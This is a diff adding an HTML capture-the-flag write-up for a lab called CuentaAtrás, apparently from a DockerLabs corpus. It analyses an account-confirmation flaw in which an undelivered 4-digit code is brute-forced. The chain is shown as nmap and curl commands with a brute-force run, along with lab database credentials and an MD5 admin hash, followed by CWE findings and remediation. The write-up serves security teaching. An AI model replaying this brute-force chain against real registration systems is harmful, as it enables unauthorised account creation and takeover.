@@ -1,0 +1,1179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 220 CuentaAtrás &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; CuentaAtrás</p><h1 id="220-cuentaatrás--writeup">220 CuentaAtrás — writeup</h1>
+<p><strong>Lab:</strong> 220 · <em>CuentaAtrás</em> · Medio
+<strong>Description (from the platform catalog and <code>tooling/labs.manifest:58</code>):</strong> <em>&quot;WordPress
+platform; account lifecycle.&quot;</em> — <code>220|CuentaAtrás|medio|WordPress platform; account lifecycle</code>
+<strong>Target:</strong> <code>[net-0-5]</code> — single container <code>cuentaatras_container</code>, image <code>cuentaatras:latest</code>.
+<strong>Stack (from the artefact, not from memory):</strong> Ubuntu 24.04, Apache 2.4.58, PHP 8.3.6,
+MariaDB on <code>127.0.0.1:3306</code>, <strong>WordPress 6.9.1</strong> hidden at
+<code>/var/www/html/secret_portal_65hBlEo9OU</code>, plus a <strong>bespoke 6-file PHP application</strong> at the
+document root that <em>is</em> the account lifecycle.
+<strong>Plugin:</strong> <code>wpvivid-backuprestore</code> 0.9.123 (<code>active_plugins</code> contains exactly one entry).
+<strong>Result:</strong> unauthenticated → account created → <strong>state transition &quot;exists → confirmed&quot; forced
+by guessing</strong> → authenticated as an attacker-chosen account → the hidden WordPress path
+disclosed by the dashboard. <strong><code>uid=33(www-data)</code> is the ceiling of the whole web surface, and
+neither reward is reachable from it</strong> (§8, §9).
+<strong>A reward exists — two of them</strong> (§8).</p>
+<p><strong>Topology.</strong> <code>auto_deploy.sh</code> was read, never run. It creates <strong>no network at all</strong>: one
+<code>docker run -d</code> on the default bridge (line 131) and one container (line 146 is the
+<code>while true</code>). No macvlan, no second host, no pivot. Unlike labs 61 and 108 there is no
+<code>--internal</code> network here, so the container <strong>does</strong> have egress; §9 shows that changed
+nothing about the findings and I used it for nothing.</p>
+<hr />
+<h2 id="0-the-headline-the-state-machine-is-the-attack-surface-and-the-did-it-get-sent-question-decides-it">0. The headline: the state machine <em>is</em> the attack surface, and the &quot;did it get sent?&quot; question decides it</h2>
+<p>The brief asked for the boundary between <strong>&quot;a user exists&quot;</strong> and <strong>&quot;a user is confirmed&quot;</strong>, and
+for the answer to <em>where mail actually goes in this lab</em>. The artefact answers the second
+question decisively, and the answer is what turns the first one into a vulnerability.</p>
+<blockquote>
+<p><strong>There is no mail in this lab. There is no mail <em>transport</em> in this lab.</strong></p>
+<pre><code>$ grep -rn &quot;mail(&quot; /var/www/html/*.php            -&gt; zero hits
+$ which mail sendmail msmtp mutt                  -&gt; not found
+$ ls -la /var/mail/                               -&gt; total 12, empty
+$ ps aux | grep -iE &quot;sendmail|smtp|mail&quot;          -&gt; (nothing)
+</code></pre>
+<p><code>register.php</code> writes the UI string <em>&quot;Hemos enviado un código SMS de 4 dígitos a tu móvil
+registrado.&quot;</em> (<code>verify.php:53</code>) and the application <strong>never sends anything</strong>. The 4-digit
+code is generated (<code>register.php:13</code>), stored (<code>register.php:16-17</code>), compared
+(<code>verify.php:24</code>) — and delivered to no one, ever.</p>
+</blockquote>
+<p>Everything below follows from that one fact, so it is stated as a rule rather than as a bug
+in a file:</p>
+<blockquote>
+<p><strong>Rule (a state machine whose transition token is undeliverable is not a state machine).</strong>
+A confirmation gate is a <em>transport</em> problem before it is a <em>secret</em> problem. If the token
+is generated, stored and checked, but <strong>no channel carries it to the party that is supposed
+to present it</strong>, then the gate has exactly one reachable transition for every party that
+did not legitimately receive the token: <strong>guess it</strong>. Every other property of the token —
+length, alphabet, entropy, CSPRNG vs <code>rand()</code>, storage, binding, expiry — is then a
+<em>second-order</em> property, because the first-order property (reachability of the honest path)
+is already false.</p>
+<p>The corollary is the part a tester has to check first, and it is cheap: <strong>for each token the
+lifecycle issues, find the delivery channel in the artefact before you start attacking the
+token.</strong> A grep for the send function answers it in seconds, and its absence reframes the
+entire engagement. Lab 61 and lab 108 both spent their whole budget on a <em>sink</em>; here the
+sink is unreachable and the <em>transition</em> is the whole lab.</p>
+</blockquote>
+<p>And the general form of the class question — <em>&quot;does anything check the difference between a
+user and a confirmed user?&quot;</em> — has a three-part answer, and <strong>this lab contains all three
+states and enforces only one of them</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>The three states</th>
+<th>Enforced here?</th>
+<th>Where</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>a user does not exist</strong></td>
+<td>✅ <strong>yes</strong></td>
+<td><code>UNIQUE KEY username</code> on <code>ctf_db.users</code>; duplicate registration refused in three variants (§10, C2)</td>
+</tr>
+<tr>
+<td><strong>a user exists but is not confirmed</strong></td>
+<td>✅ <strong>yes</strong></td>
+<td><code>index.php:11-17</code> refuses the login with a byte-distinct message (§10, C4)</td>
+</tr>
+<tr>
+<td><strong>a confirmation token is bound to the account it confirms</strong></td>
+<td>❌ <strong>no</strong></td>
+<td>the token is a 10⁴-space value with <strong>no attempt counter, no lockout, no rate limit</strong>, and the only thing that could have bound it to a requester was the fact that nobody can receive it (§4, F1)</td>
+</tr>
+</tbody>
+</table>
+<p>So: <strong>the boundary between &quot;exists&quot; and &quot;confirmed&quot; is drawn, and something does check it — the
+<code>is_verified</code> gate held against every test I threw at it. What does not exist is a second
+boundary, between &quot;the token was <em>issued</em>&quot; and &quot;the token was <em>delivered</em>&quot;, and the absence of
+that boundary is what makes the first boundary decorative.</strong> That is the transferable form, and
+it is why the finding is filed as a lifecycle defect rather than as a weak-OTP defect: the OTP
+is only weak <em>because</em> nothing delivers it.</p>
+<h3 id="01-the-token-storage-question-answered-for-this-corpuss-second-recurring-class">0.1 The token-storage question, answered for this corpus's second recurring class</h3>
+<p>The brief also asked <em>where does a token live and who can read it</em>. This lab has <strong>three</strong>
+answers, and the third is the sharpest:</p>
+<table>
+<thead>
+<tr>
+<th>Token</th>
+<th>Where it lives</th>
+<th>Who can read it</th>
+<th>Finding</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>the 4-digit account-confirmation code</td>
+<td><code>ctf_db.verifications.code</code>, <strong><code>varchar(4)</code>, plaintext</strong>, <code>PRIMARY KEY (username)</code></td>
+<td>anyone with SQL on <code>ctf_db</code> — and the credential that opens it (<code>ctf_pass</code>) lives in <strong><code>/var/www/html/db.php</code>, a file in the served document root</strong></td>
+<td><strong>F2</strong></td>
+</tr>
+<tr>
+<td>the WordPress administrator password</td>
+<td><code>wp_users.user_pass</code> = a <strong>bare, unsalted, single-round MD5</strong> <code>49308bda8b5e0ab9688ec4bedf6d572c</code> — no <code>$P$</code>, no <code>$wp$</code>, no phpass</td>
+<td>anyone who can read the row, at ~3·10⁶ hashes/second on this host</td>
+<td><strong>F3</strong></td>
+</tr>
+<tr>
+<td>the WPvivid site API keypair</td>
+<td><code>wp_options.wpvivid_api_token</code> — an <strong>RSA private key, base64, in the options table</strong>, and <strong>regenerable by any unauthenticated client</strong></td>
+<td>the web tier; and it is <em>rotatable</em> by the whole internet</td>
+<td><strong>F4, F5</strong></td>
+</tr>
+</tbody>
+</table>
+<p><code>db.php</code> deserves its own line, because it is the cleanest instance of the class in this corpus:</p>
+<pre><code class="language-php">// /var/www/html/db.php:2-6  — mode 0755, owner www-data, INSIDE DocumentRoot /var/www/html
+$host = '127.0.0.1';
+$db   = 'ctf_db';
+$user = 'ctf_user';
+$pass = 'ctf_pass';
+</code></pre>
+<p><code>db.php</code> executes and returns <strong>0 bytes</strong> (I checked: <code>GET /db.php</code> → <code>200</code>, <code>size_download=0</code>),
+so it discloses nothing <em>on its own</em>. Its significance is different and is the general rule:</p>
+<blockquote>
+<p><strong>Rule (a token store whose credential sits in the served tree is one web primitive away from
+a token disclosure).</strong> I did not need to read <code>db.php</code> — I had <code>docker exec</code> — but the
+reason I could read <code>verifications.code</code> as ground truth at all is that the <em>intended</em>
+attacker path to it is: any file-read primitive anywhere in <code>/var/www/html</code> (a path
+traversal, an LFI, a mis-scoped <code>Alias</code>, a backup under the root) yields the credential,
+and the credential yields <strong>every pending confirmation token for every account, in
+plaintext, in one query</strong>. The 10⁴ brute force in §4 is not even the cheapest read of that
+table; it is the <em>second</em> cheapest.</p>
+</blockquote>
+<hr />
+<h2 id="1-surface">1. Surface</h2>
+<pre><code>$ nmap -sV -Pn -p- [net-0-5]
+Nmap scan report for [net-0-5]
+Host is up (0.000046s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+</code></pre>
+<p><strong>What a TCP scan cannot see — measured, not assumed:</strong></p>
+<pre><code>$ docker exec cuentaatras_container cat /proc/net/udp
+  sl  local_address rem_address st ... uid ...
+  (header only — no rows)
+$ docker exec cuentaatras_container cat /proc/net/udp6
+  (header only — no rows)
+$ docker inspect cuentaatras:latest -f '{{json .Config.ExposedPorts}}'  -&gt; null
+</code></pre>
+<p>Zero UDP rows on both tables, so unlike lab 65 and lab 295 the <code>-p-</code> blind spot is empty here.
+<code>ss -lntup</code> agrees and adds the two non-remote listeners:</p>
+<pre><code>tcp LISTEN 0 511   0.0.0.0:80        users:((&quot;apache2&quot;,pid=33,fd=3))
+tcp LISTEN 0 128   0.0.0.0:22        users:((&quot;sshd&quot;,pid=15,fd=3))
+tcp LISTEN 0 80    127.0.0.1:3306                          &lt;- mariadbd, loopback-only
+</code></pre>
+<h3 id="11-two-applications-on-one-origin-and-the-second-one-is-the-secret">1.1 Two applications on one origin, and the second one is the secret</h3>
+<p><code>/var/www/html</code> is <strong>not</strong> a WordPress install. It is a 6-file PHP application, and WordPress
+is moved <em>underneath it</em> at a randomised path. This is the shape neither lab 61 nor lab 108
+had, and it is why recon has to enumerate the root before it enumerates anything else:</p>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Status / bytes</th>
+<th>What it is</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/</code></td>
+<td>200, 503 B</td>
+<td><code>index.php</code> — the login form</td>
+</tr>
+<tr>
+<td><code>/register.php</code></td>
+<td>200, 734 B</td>
+<td><strong>open registration</strong> — the lifecycle's first transition</td>
+</tr>
+<tr>
+<td><code>/verify.php</code></td>
+<td>200, ~960 B</td>
+<td>the confirmation form; <strong>302 → <code>register.php</code> without <code>$_SESSION['verify_user']</code></strong></td>
+</tr>
+<tr>
+<td><code>/dashboard.php</code></td>
+<td><strong>302 → <code>index.php</code></strong> unauthenticated</td>
+<td>the only page that prints the secret path</td>
+</tr>
+<tr>
+<td><code>/logout.php</code></td>
+<td>302</td>
+<td><code>session_destroy()</code></td>
+</tr>
+<tr>
+<td><code>/db.php</code></td>
+<td><strong>200, 0 bytes</strong></td>
+<td>the database credential, inside the document root (F2)</td>
+</tr>
+<tr>
+<td><code>/copy2321_.php</code></td>
+<td>200</td>
+<td><strong>not PHP</strong> — a raw captured HTTP request, left in the tree (§7, D8)</td>
+</tr>
+<tr>
+<td><code>/style.css</code></td>
+<td>200</td>
+<td>623 B, the only static asset</td>
+</tr>
+<tr>
+<td><code>/secret_portal_65hBlEo9OU/</code></td>
+<td>200, 66138 B</td>
+<td>WordPress 6.9.1 — <strong>undiscoverable without <code>dashboard.php</code></strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>The trípleta, applied to the one surface that matters:</strong></p>
+<ol>
+<li><strong>Reachable</strong> — <code>GET /secret_portal_65hBlEo9OU/</code> returns <code>200</code>, 66138 bytes.</li>
+<li><strong>What the body carries</strong> — <code>&lt;title&gt;Portal Corporativo&lt;/title&gt;</code>, a WordPress 6.9.1 install,
+<code>wpvivid-backuprestore</code> active, one administrator <code>admin_master</code>.</li>
+<li><strong>Decisive</strong> — the path is a <em>string in a file</em>, <code>/etc/wp_secret_path</code>, mode
+<code>0644 root:root</code>, content <code>/secret_portal_65hBlEo9OU</code>, and <code>dashboard.php:4</code> prints it to
+any authenticated session. <strong>A wordlist would never have found this path</strong> (18 chars,
+mixed case, mixed alphabet, no dictionary word). The only route to it is the account
+lifecycle. That is the lab's design in one sentence.</li>
+</ol>
+<h3 id="12-where-the-platform-is-and-what-it-exposes">1.2 Where the platform <em>is</em>, and what it exposes</h3>
+<pre><code>$ for p in &quot;&quot; wp-login.php wp-admin/ &quot;index.php?rest_route=/wp/v2/users&quot; xmlrpc.php \
+           generate_key.php generate_migration_key.php wp-json/ readme.html; do ... done
+                                200 66138
+wp-login.php                     200  4985
+wp-admin/                        302     0
+index.php?rest_route=/wp/v2/users 200   847
+xmlrpc.php                       405    42
+generate_key.php                 200    55     &lt;- F5: unauthenticated keypair rotation
+generate_migration_key.php       500  2653
+wp-json/                         404   272     &lt;- permalinks off; ?rest_route= is the live API
+readme.html                      200  7425
+</code></pre>
+<p>Note the same trap lab 61 documented (<code>/wp-json/</code> → 404 here rather than 500) — the pretty REST
+root does not exist because permalinks are off, and <code>?rest_route=/wp/v2/users</code> answers <code>200</code>
+with the user list. I did not enumerate the REST surface further: <code>users_can_register=0</code>, one
+administrator, and nothing in the plugin registers a REST route (<code>grep -rn register_rest_route</code>
+over the plugin → <strong>zero hits</strong>).</p>
+<hr />
+<h2 id="2-the-class">2. The class</h2>
+<p><strong>Entry criterion:</strong> <em>for each transition in the account lifecycle, find the token that
+guards it and then find the channel that delivers it. Where the channel does not exist, the
+transition is unguarded no matter how good the token looks.</em></p>
+<p><strong>Source that settled it:</strong> <code>register.php</code> read in full, plus one <code>grep</code> for the send function
+that returned nothing (§0). I did not fuzz anything first. Concretely, the four files that
+matter are 5.7 KB of PHP total, and they answer every question in the class:</p>
+<pre><code>index.php     1348 B   login + the is_verified gate
+register.php  1862 B   the INSERT, the token mint, the session write
+verify.php    2426 B   the token compare, the expiry DELETE, the is_verified UPDATE
+db.php         428 B   the credential, in the document root
+</code></pre>
+<p><strong>What they write, and what they send — the complete inventory:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Transition</th>
+<th>Table / column written</th>
+<th>Column read to gate it</th>
+<th>Delivered to the user?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>register</td>
+<td><code>users</code> (name, username, password, email, phone); <code>is_verified</code> left at its <strong>default 0</strong></td>
+<td>—</td>
+<td>—</td>
+</tr>
+<tr>
+<td>token mint</td>
+<td><code>verifications</code> (username, code, <strong>plaintext</strong>, expires_at = now+300)</td>
+<td>—</td>
+<td><strong>nothing — no transport exists</strong></td>
+</tr>
+<tr>
+<td>confirm</td>
+<td><code>users.is_verified = 1</code>; <code>verifications</code> row deleted</td>
+<td><code>$_SESSION['verify_user']</code> <strong>and</strong> <code>$_POST['code']</code></td>
+<td>—</td>
+</tr>
+<tr>
+<td>expiry cleanup</td>
+<td><strong><code>DELETE FROM users WHERE username = ?</code></strong> + <code>DELETE FROM verifications</code></td>
+<td><code>time() &gt; expires_at</code></td>
+<td>—</td>
+</tr>
+<tr>
+<td>login</td>
+<td><code>$_SESSION['user']</code></td>
+<td><code>password_verify()</code> <strong>and</strong> <code>$user['is_verified']</code></td>
+<td>—</td>
+</tr>
+</tbody>
+</table>
+<p><strong>The <code>email</code> and <code>phone</code> columns are collected, stored, and never read again.</strong> <code>grep</code> proves
+it: the only occurrences of <code>email</code> in the six files are the <code>INSERT</code> at <code>register.php:7,11</code>
+and the <code>&lt;input type=&quot;email&quot;&gt;</code> at <code>register.php:35</code>. There is no email-verification step at
+all — not a weak one, <strong>not one</strong>. And <code>users.email</code> has <strong>no UNIQUE key</strong> (F6).</p>
+<hr />
+<h2 id="3-the-chain">3. The chain</h2>
+<p>Reproduced end to end on the <strong>restored, shipped</strong> container (§9). No client follows
+redirects; each hop is asserted on its <code>Location</code> header.</p>
+<pre><code>$ U=demo$(date +%s)
+$ curl -sS -D - -o /dev/null -c jar -X POST http://[net-0-5]/register.php \
+    --data-urlencode &quot;name=Demo&quot; --data-urlencode &quot;username=$U&quot; \
+    --data-urlencode &quot;password=Passw0rd!220&quot; --data-urlencode &quot;email=$U@example.invalid&quot; \
+    --data-urlencode &quot;phone=+34600000000&quot;
+HTTP/1.1 302 Found
+[response-cookie-header]: PHPSESSID=jnqme978a8fegph9l0f4vd7m4q; path=/
+Location: verify.php
+</code></pre>
+<pre><code>$ python3 otp.py jar                       # the code is NEVER read from the database
+SID=jnqme978a8fegph9l0f4vd7m4q
+SESSION_LIVENESS status=200 timeLeft=300 bytes=960
+WORK: attempts=3015 space=10000 elapsed=0.9s rate=3529/s
+FOUND code=6994 status=302 location=index.php?msg=Registrado correctamente. Por favor inicia sesiÃ³n.
+</code></pre>
+<pre><code>$ curl -sS -D - -o /dev/null -b jar -c jar -X POST http://[net-0-5]/index.php \
+    --data-urlencode &quot;username=$U&quot; --data-urlencode &quot;password=Passw0rd!220&quot;
+HTTP/1.1 302 Found
+Location: dashboard.php
+
+$ curl -sS -b jar -c jar http://[net-0-5]/dashboard.php
+status=200 bytes=704
+body contains: &quot;migrado a una ruta segura secreta&quot;  and  &quot;/secret_portal_65hBlEo9OU&quot;
+</code></pre>
+<pre><code>$ docker exec cuentaatras_container mysql -u root -N -B ctf_db -e \
+    &quot;select username,is_verified from users; select count(*) from verifications;&quot;
+demo1790746303	1        &lt;- the transition is committed
+0                      &lt;- and the token is consumed
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>→</th>
+<th>Mechanism</th>
+<th>Identity proof</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>unauth</td>
+<td>full TCP scan; <code>/proc/net/udp{,6}</code> empty</td>
+<td>65533 closed; <strong>0</strong> UDP rows on both tables</td>
+</tr>
+<tr>
+<td>2</td>
+<td>unauth</td>
+<td><code>POST /register.php</code> — open registration, <code>is_verified</code> defaults to 0</td>
+<td><code>302 → verify.php</code>, <code>[response-cookie-header]: PHPSESSID=…</code>; <code>users</code> row with <code>is_verified=0</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>unauth</td>
+<td><strong>3 015 of 10 000 guesses</strong> against a 4-digit token with no attempt counter</td>
+<td><code>302 → index.php?msg=Registrado correctamente…</code>; <code>is_verified=1</code> committed; token row deleted</td>
+</tr>
+<tr>
+<td>4</td>
+<td>unauth (session)</td>
+<td><code>POST /index.php</code> — the <code>is_verified</code> gate <strong>passes</strong> legitimately now</td>
+<td><code>302 → dashboard.php</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>auth <code>uid=33</code></td>
+<td><code>dashboard.php:4</code> reads <code>/etc/wp_secret_path</code> and <code>:13</code> prints it</td>
+<td>Apache child <code>Uid: 33 33 33 33</code> — real <strong>and</strong> effective <strong>and</strong> fs = 33 (§6)</td>
+</tr>
+<tr>
+<td>6</td>
+<td>auth <code>uid=33</code></td>
+<td>WordPress 6.9.1 + <code>wpvivid-backuprestore</code> at the disclosed path</td>
+<td>front page <code>200</code>, 66138 B; <code>?rest_route=/wp/v2/users</code> <code>200</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td><strong>blocked</strong></td>
+<td><code>wpvivid</code>'s unauthenticated <code>send_to_site</code> file-write primitive</td>
+<td>its only gate is the RSA key in <code>wp_options</code>, which I could not obtain (§9)</td>
+</tr>
+<tr>
+<td>8</td>
+<td><strong>blocked</strong></td>
+<td><code>webmaster → sudo /usr/bin/tar → root</code></td>
+<td>the rung <strong>works</strong> (<code>sudo -u webmaster sudo -n tar --version</code> → <code>tar (GNU tar) 1.35</code>) and is <strong>unreachable</strong>: <code>sudo -l -U www-data</code> → <em>not allowed</em>; <code>find / -xdev -user webmaster</code> → <strong>0 files</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>The execution identity at every hop, as a <code>uid</code>/<code>euid</code> pair</strong> (the RUNBOOK's rule 1):</p>
+<pre><code>pid=33   /usr/sbin/apache2-kstart   Uid:  0  0  0  0     &lt;- apache master, real=euid=0
+pid=38…42,534                     Uid: 33 33 33 33     &lt;- the workers that execute every PHP request
+pid=199  /usr/sbin/mariadbd        Uid: 103 103 103 103  Gid: 104 104 104 104
+pid=72   /usr/bin/mariadbd-safe    Uid:  0  0  0  0     &lt;- the wrapper, not the server
+</code></pre>
+<p><code>pid 534</code> was the live child serving my request. <strong>There is no privilege delta anywhere in the
+web surface</strong>: real = effective = saved = fs = 33. Every hop above is <code>uid=33(www-data)</code>.
+This is the measurement that bounds the whole engagement, and it is why §8's conclusion is a
+measurement rather than an opinion.</p>
+<hr />
+<h2 id="4-findings">4. Findings</h2>
+<h3 id="f1--the-account-confirmation-gate-is-not-a-gate-a-4-digit-token-never-delivered-checked-with-no-attempt-counter-and-no-rate-limit">F1 — The account-confirmation gate is not a gate: a 4-digit token, never delivered, checked with no attempt counter and no rate limit</h3>
+<p><strong>CWE-799 (improper control of interaction frequency) + CWE-330 (use of insufficiently random
+values) + CWE-307 (improper restriction of excessive authentication attempts) · High</strong></p>
+<p>Three independent conditions, each measured, each sufficient on its own to make the transition
+forgeable, and together they are the lab:</p>
+<p><strong>(a) The token is never delivered — there is no transport in the lab.</strong></p>
+<pre><code class="language-php">// register.php:13-17  — the entire &quot;send&quot; step
+$code = str_pad(rand(0, 9999), 4, '0', STR_PAD_LEFT);
+$expires = time() + 300; // 5 minutes
+$stmt = $pdo-&gt;prepare('INSERT INTO verifications (username, code, expires_at) VALUES (?,?,?) ON DUPLICATE KEY UPDATE code=?, expires_at=?');
+$stmt-&gt;execute([$username, $code, $expires, $code, $expires]);
+</code></pre>
+<p><code>rand()</code>, <code>str_pad</code>, an INSERT. Then <code>register.php:19-21</code>: <code>$_SESSION['verify_user'] = $username; header('Location: verify.php');</code>. The UI promises an SMS at <code>verify.php:53</code>
+(<em>&quot;Hemos enviado un código SMS de 4 dígitos a tu móvil registrado&quot;</em>). §0 carries the grep that
+proves no send function, no MTA and no spool exist. <strong>The honest path is unreachable, so the
+only remaining path is the guess.</strong></p>
+<p><strong>(b) The token space is 10 000 and the generator is <code>rand()</code>, not <code>random_int()</code>.</strong></p>
+<p><strong>(c) The comparison has no attempt counter, no lockout, no per-account or per-IP budget, and
+no delay.</strong> <code>verify.php:24</code> is the whole check:</p>
+<pre><code class="language-php">if (isset($_POST['code']) &amp;&amp; $_POST['code'] === $verification['code']) { … }
+</code></pre>
+<p>Measured: <strong>3 015 of 10 000 attempts in 0.9 s at 3 529 attempts/second</strong>, ten concurrent
+connections, zero throttling observed, and the 5-minute window is an inconvenience, not a
+control. Three independent runs of the same exploit found the code at attempts 4 160, 3 015 and
+(control) 1.</p>
+<p><strong>Positive control first, as required for a state machine.</strong> Before claiming any transition was
+bypassed, I showed it succeeding for a legitimate path, on a fresh account, with the code read
+from the artefact rather than guessed:</p>
+<pre><code>POSITIVE_CONTROL code=0267 -&gt; status=302 location=index.php?msg=Registrado correctamente…
+DB: username=pctl1790745615  is_verified=1   token row deleted
+</code></pre>
+<p><strong>The negative is proven too</strong>, with its work count: eleven wrong codes against a fresh account
+whose real code (<code>7055</code>) was deliberately withheld — <code>status=200</code>, body
+<code>&quot;Código incorrecto. Inténtalo de nuevo.&quot;</code>, and <code>is_verified</code> still <code>0</code>. So the check <em>does</em>
+execute and <em>does</em> discriminate; the code reached the handler, and the handler simply has no
+opinion about how many times it may be asked.</p>
+<p><strong>Impact.</strong> The <code>is_verified</code> boundary in <code>index.php:11-17</code> — the one control in this lab that
+genuinely holds — becomes unconditional, because an unauthenticated client can put itself on
+the verified side in under a second. Every downstream grant of a &quot;confirmed&quot; account is
+consequently attacker-chosen, including the disclosure of the hidden WordPress path (§3, hop 5),
+which is the gate to the entire second half of the lab.</p>
+<p><strong>Remediation.</strong> In order of how much each one is worth:</p>
+<ol>
+<li><strong>Deliver the token, or do not gate on it.</strong> A confirmation gate nobody can satisfy is a
+denial of service wearing a security control. If SMS is not available, fail the
+registration closed and say so — do not mint a token into a table and hope.</li>
+<li>Replace <code>rand(0,9999)</code> with <code>random_int(0, 9999)</code> and, better, with a token of ≥ 128 bits:
+<code>bin2hex(random_bytes(16))</code>. A 4-digit code is a <em>second</em> factor, not an identity proof.</li>
+<li><strong>Enforce the attempt budget in the datastore, not in the request.</strong> There is no counter
+column in <code>verifications</code> — that is the root cause. Add <code>attempts</code>, <code>locked_until</code>, and a
+hard invalidation at N; delete the row on success as you already do.</li>
+<li>Rate-limit <code>verify.php</code> per account and per source, and make the failure path constant-time
+and constant-body so it is not an oracle for a <em>valid</em> account.</li>
+</ol>
+<h3 id="f2--the-confirmation-token-is-stored-in-plaintext-keyed-only-by-a-client-supplied-username-and-the-credential-that-reads-it-is-inside-the-served-document-root">F2 — The confirmation token is stored in plaintext, keyed only by a client-supplied username, and the credential that reads it is inside the served document root</h3>
+<p><strong>CWE-256 (plaintext storage of a password) / CWE-312 / CWE-522 · High</strong></p>
+<pre><code class="language-sql">CREATE TABLE `verifications` (
+  `username` varchar(50) NOT NULL,
+  `code` varchar(4) DEFAULT NULL,      -- plaintext, 4 chars, the whole secret
+  `expires_at` int(11) DEFAULT NULL,
+  PRIMARY KEY (`username`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
+</code></pre>
+<pre><code class="language-php">// /var/www/html/db.php:2-6 — mode 0755 www-data, DocumentRoot /var/www/html
+$db = 'ctf_db'; $user = 'ctf_user'; $pass = 'ctf_pass';
+</code></pre>
+<p>Three separate defects, filed as one because they compose and each is independently wrong:</p>
+<ol>
+<li><strong>Plaintext token in the database.</strong> No hash, no HMAC, no per-token salt. There is nothing
+to steal <em>slowly</em>; a single <code>SELECT username, code FROM verifications</code> hands over every
+pending account confirmation in the installation, simultaneously, for every account, with
+zero cracking.</li>
+<li><strong>The key is a client-supplied string, not an account identifier.</strong> <code>PRIMARY KEY (username)</code>,
+and <code>username</code> is <code>$_POST['username']</code> verbatim. There is no foreign key to <code>users.id</code>, no
+binding to the <code>email</code> or <code>phone</code> that were collected alongside, and no binding to the
+session that requested it beyond <code>register.php:19</code> — which is a convenience, not a control
+(see §7, D4, for the one way I tried to break that binding and failed).</li>
+<li><strong>The credential is in the served tree.</strong> <code>GET /db.php</code> returns <code>200</code> with <strong>0 bytes</strong> — PHP
+executes it — so nothing leaks by fetching it. But the <em>distance</em> between &quot;an arbitrary local
+file read in <code>/var/www/html</code>&quot; and &quot;every pending account token in the installation&quot; is one
+<code>require</code>.</li>
+</ol>
+<p><strong>Impact.</strong> Any file-read primitive anywhere under <code>/var/www/html</code> — a traversal, an LFI, a
+mis-scoped Apache <code>Alias</code> (lab 61 found <code>phpMyAdmin</code> exposed exactly this way), a stray backup
+archive, a <code>.bak</code> of a config — becomes <strong>mass account confirmation</strong>, with no cracking and no
+per-account effort. It is also the reason the brute force in F1 is not the cheapest attack: the
+table can simply be read.</p>
+<p><strong>Remediation.</strong> Store <code>hash_hmac('sha256', $code, $per_account_salt)</code> and compare with
+<code>hash_equals()</code>; key the row on <code>users.id</code> with a real foreign key; keep the token lifecycle
+(outstanding → consumed → expired) in one place; and move <code>db.php</code> out of the document root
+entirely — <code>chmod 640</code> and a path above <code>/var/www/html</code> is the minimum, and it should not be in
+the tree at all.</p>
+<h3 id="f3--the-wordpress-administrator-password-is-stored-as-a-bare-unsalted-single-round-md5">F3 — The WordPress administrator password is stored as a bare, unsalted, single-round MD5</h3>
+<p><strong>CWE-328 (use of weak hash) / CWE-916 (password hash with insufficient computational effort) · High</strong></p>
+<pre><code>$ mysql -u root -N -B wp_db -e &quot;select ID,user_login,user_pass,user_email from wp_users&quot;
+1  admin_master  49308bda8b5e0ab9688ec4bedf6d572c  admin@example.local
+</code></pre>
+<p><strong>32 hex characters. No <code>$P$</code>, no <code>$wp$</code>, no phpass, no bcrypt, no salt, no rounds.</strong> This is
+not what <code>wp_hash_password()</code> produces and it is not what <code>wp_check_password()</code> expects to
+verify — a WordPress install that stores this has had its credential column written by
+something other than core (here: a setup script run at <code>2026-03-01 15:09:33</code>, ninety seconds
+after the web server came up).</p>
+<p><strong>Impact.</strong> The entire administrator credential is recoverable <strong>offline and instantly</strong> by
+anyone who can read one row: an unsalted MD5 runs at ~3·10⁶ candidates/second on one core of
+this analysis host. There is no work factor at all. This is the credential that guards the
+second half of the lab, and it is stored in the weakest form the platform can be made to store
+anything in.</p>
+<p><strong>I did not recover the plaintext</strong>, and the negative carries its work count (§11, D2):
+<strong>483 466 186 candidates</strong> hashed, 0 hits — all numerics <code>0 … 10⁸</code>, all lowercase-alphabetic
+strings of length ≤ 6, all lowercase-alphanumeric of length ≤ 5, plus 540 952 lines from the
+two wordlists on this host, plus a 4 062-candidate lab-themed set with 18 mutation rules. The
+positive control passed first (my <code>md5()</code> byte-matched <code>openssl dgst -md5</code> on a
+self-chosen string), so this is a real negative and not an untested one. <strong>It is a limit of the
+tooling available on this host, not evidence that the password is strong</strong> — see §10.</p>
+<p><strong>Remediation.</strong> Never write <code>user_pass</code> directly. Provision the administrator through
+<code>wp user create --role=administrator</code> (or <code>wp_hash_password()</code>), so the stored value is
+phppass/bcrypt with a per-user salt; and add a startup assertion that every <code>wp_users.user_pass</code>
+matches the expected prefix, because a bare 32-hex value is <em>mechanically</em> detectable and this
+lab's credential was stored in exactly that shape for exactly this long.</p>
